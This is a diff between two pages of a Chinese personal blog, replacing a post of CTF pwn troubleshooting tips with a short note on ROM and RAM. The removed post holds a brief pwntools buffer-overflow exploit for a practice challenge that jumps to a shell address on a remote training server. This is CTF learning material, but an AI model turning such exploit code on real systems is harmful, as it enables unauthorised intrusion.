@@ -16,27 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解决或未解决的奇怪问题">
+    <meta name="description" content="learning notes">
 <meta property="og:type" content="article">
-<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
-<meta property="og:url" content="https://isolator-1.github.io/2023/12/05/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:title" content="乱七八糟的知识">
+<meta property="og:url" content="https://isolator-1.github.io/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="解决或未解决的奇怪问题">
+<meta property="og:description" content="learning notes">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/problems/1.jpg">
-<meta property="article:published_time" content="2023-12-05T05:58:00.000Z">
-<meta property="article:modified_time" content="2023-12-05T06:08:36.755Z">
+<meta property="article:published_time" content="2023-12-13T10:15:00.000Z">
+<meta property="article:modified_time" content="2023-12-13T10:29:46.469Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="Others">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/problems/1.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
+  <title>乱七八糟的知识 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +212,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
+            <span id="subtitle" data-typed-text="乱七八糟的知识"></span>
           
         </div>
 
@@ -226,8 +223,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-05 13:58" pubdate>
-          December 5, 2023 pm
+        <time datetime="2023-12-13 18:15" pubdate>
+          December 13, 2023 pm
         </time>
       </span>
     
@@ -238,7 +235,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k words
+          140 words
         
       </span>
     
@@ -249,7 +246,7 @@
         
         
         
-          14 mins
+          2 mins
         
       </span>
     
@@ -287,52 +284,14 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
+            <h1 style="display: none">乱七八糟的知识</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>vmware自带的vmtools安装了也复制不进来</strong></p>
-<p>虚拟机执行命令</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure>
-
-<p>如果拖放文件的时候出现了</p>
-<p><img src="/img/problems/1.jpg" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure>
-
-<p>将<code>WaylandEnable=false</code>注释掉</p>
-<p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p>
-<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
-<p>本来是很简单的一个溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
-
-<p>但是不加sleep无法通过</p>
-<p>有人说是python同时发送多个字符串时会合并(?)</p>
-<p>那什么时候情况下需要在sendline前面加一个sleep</p>
-<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>
-<hr>
-<h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>
-
-<p>用到这个快捷方式时要修改一下</p>
-<h4 id="sendlineafter的问题"><a href="#sendlineafter的问题" class="headerlink" title="sendlineafter的问题"></a>sendlineafter的问题</h4><p>要加上换行符<code>\n</code>，否则匹配不上</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.sendlineafter</span>(b<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,...)<br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="python调用c库函数"><a href="#python调用c库函数" class="headerlink" title="python调用c库函数"></a>python调用c库函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">0</span>)<br>libc.rand()%<span class="hljs-number">6</span> + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h4 id="安装ubuntu18，pwndbg安装不上（setup-sh总有问题）"><a href="#安装ubuntu18，pwndbg安装不上（setup-sh总有问题）" class="headerlink" title="安装ubuntu18，pwndbg安装不上（setup.sh总有问题）"></a>安装ubuntu18，pwndbg安装不上（setup.sh总有问题）</h4><p>选择用pwndbg release的安装包，安装之后把<code>/usr/bin/gdb</code>给改成<code>/usr/ bin/pwndbg</code>的软连接</p>
-<p>然后在调用<code>gdb.attach</code>时弹不出来新的窗口：</p>
-<p>采用tmux解决，安装tmux后，程序开头加上一句话</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br></code></pre></td></tr></table></figure>
-
-<p>然后再命令行先运行sudo tmux，然后运行exp.py，就可以弹出来gdb了。</p>
-<p>然后发现无法滚动鼠标，使用<code>ctrl + shift + b + :</code>进入命令模式，输入<code>set -g mouse on</code></p>
-<p>就可以滚动终端了</p>
+                <h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="ROM和RAM"><a href="#ROM和RAM" class="headerlink" title="ROM和RAM"></a>ROM和RAM</h3><p>RAM（Random Access Memory）</p>
+<p>ROM（Read Only Memory）</p>
+<p>只不过是早期ROM因为技术原因是无法擦除的，出厂之后只能读不能写，因此叫这个名字。后来除了EPROM和EEPROM，可以擦写了，但是还是从ROM技术上衍变出来的，名字还叫ROM。</p>
 
                 
               </div>
@@ -351,7 +310,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a>
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
   
   
 
@@ -366,8 +325,6 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
-      
         <a href="/tags/Others/">#Others</a>
       
     </div>
@@ -380,8 +337,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>遇到的奇奇怪怪问题汇总</div>
-      <div>https://isolator-1.github.io/2023/12/05/杂项/遇到的奇奇怪怪问题汇总/</div>
+      <div>乱七八糟的知识</div>
+      <div>https://isolator-1.github.io/2023/12/13/学习笔记/乱七八糟的知识/</div>
     </div>
     <div class="license-meta">
       
@@ -393,7 +350,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>December 5, 2023</div>
+          <div>December 13, 2023</div>
         </div>
       
       
@@ -425,9 +382,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/" title="mit6858 Lab1">
+                      <a href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/" title="OS">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">mit6858 Lab1</span>
+                        <span class="hidden-mobile">OS</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -435,8 +392,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/01/ctf-pwn/tcache%20attack/" title="tcache attack">
-                        <span class="hidden-mobile">tcache attack</span>
+                      <a href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/" title="mit6858 Lab1">
+                        <span class="hidden-mobile">mit6858 Lab1</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
